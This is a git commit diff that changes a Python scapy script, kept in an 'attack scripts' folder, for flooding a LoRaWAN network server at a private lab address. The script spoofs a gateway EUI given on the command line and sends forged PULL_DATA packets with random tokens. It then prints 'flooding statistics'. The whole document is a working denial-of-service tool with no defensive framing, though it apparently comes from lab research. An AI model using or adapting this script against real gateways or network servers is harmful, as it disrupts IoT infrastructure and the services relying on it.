e0433ae68db88e5ae1b088ffeb29df808b928489
Axel Mat <72404877+lord-seam@users.noreply.github.com>
2023-06-03 00:27:58 +0200

    Update pulldata_dos.py

--- attack scripts /pulldata_dos.py
+++ attack scripts /pulldata_dos.py
@@ -2,6 +2,7 @@
 
 import sys
 import time
+import random
 from scapy.all import *
 
 # Define the destination address and port
@@ -11,20 +12,11 @@ src_port = 56300
 dest_addr = '192.168.56.104'
 dest_port = 1700
 
-# Define the PULL_DATA payload as a string of hexadecimal characters
+# Define the PULL_DATA packet identifier
+identifier = '02'
 
-payloadx = '02c0ad02b4562d94afcda48d'
-
-# Convert the payload to binary format using the bytes.fromhex() method
-
-payload = bytes.fromhex(payloadx)
-
-# Define the IP and UDP headers
-ip = IP(src=src_addr, dst=dest_addr)
-udp = UDP(sport=src_port, dport=dest_port)
-
-# Construct the packet by combining the headers and payload
-packet = ip / udp / payload
+# Get the Gateway EUI from the command line
+gateway_eui = sys.argv[2]
 
 num_times = int(sys.argv[1])
 
@@ -33,6 +25,22 @@ start_time = time.time()
 
 # Send the packet to the destination IP address and port the specified number of times
 for i in range(num_times):
+    # Generate a random token for each packet
+    random_token = "{:04x}".format(random.randint(0, 65535))
+
+    # Create the payload for each packet
+    payloadx = identifier + random_token + identifier + gateway_eui
+
+    # Convert the payload to binary format using the bytes.fromhex() method
+    payload = bytes.fromhex(payloadx)
+
+    # Define the IP and UDP headers
+    ip = IP(src=src_addr, dst=dest_addr)
+    udp = UDP(sport=src_port, dport=dest_port)
+
+    # Construct the packet by combining the headers and payload
+    packet = ip / udp / payload
+
     send(packet) 
     time.sleep(0.5)
 
@@ -43,9 +51,9 @@ end_time = time.time()
 execution_time = end_time - start_time
 
 # Calculate the transmission rate
-transmission_rate =round(num_times / execution_time,1)
+transmission_rate = round(num_times / execution_time, 1)
 
-print("PULL DATA flooding Statistics")
+print("Keep Alive Flooding Statistics")
 print(f"Packets sent: {num_times}")
 print(f"Start time: {time.ctime(start_time)}")
 print(f"End time: {time.ctime(end_time)}")
